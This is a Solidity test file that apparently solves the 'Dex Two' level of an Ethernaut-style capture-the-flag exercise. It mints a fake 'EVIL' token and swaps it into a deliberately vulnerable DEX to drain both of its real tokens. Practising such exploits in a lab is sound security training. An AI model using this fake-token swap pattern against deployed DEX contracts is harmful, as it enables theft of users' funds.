// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {DexTwoFactory} from "../src/levels/23-DexTwoFactory.sol";
import {DexTwo, SwappableTokenTwo} from "../src/levels/23-DexTwo.sol";

contract DexTwoSolution is BaseTest {
    function solution(address payable target_) internal override{
        DexTwo target = DexTwo(target_);
        SwappableTokenTwo tkn1 = SwappableTokenTwo(target.token1());
        SwappableTokenTwo tkn2 = SwappableTokenTwo(target.token2());
        SwappableTokenTwo thirdToken = new SwappableTokenTwo(
          target_, "EVIL", "EVIL", 40);
        thirdToken.approve(target_, 1000);
        target.approve(target_, 1000);
        thirdToken.transfer(target_, 10);
        target.swap(address(thirdToken), address(tkn1), 10);
        target.swap(address(thirdToken), address(tkn2), 20);
    }

    function min(uint a, uint b) private returns(uint) {
      return a > b ? b : a;
    }


    function construction() internal override returns(address payable ) {
        return payable(address(new DexTwoFactory()));
    }
}
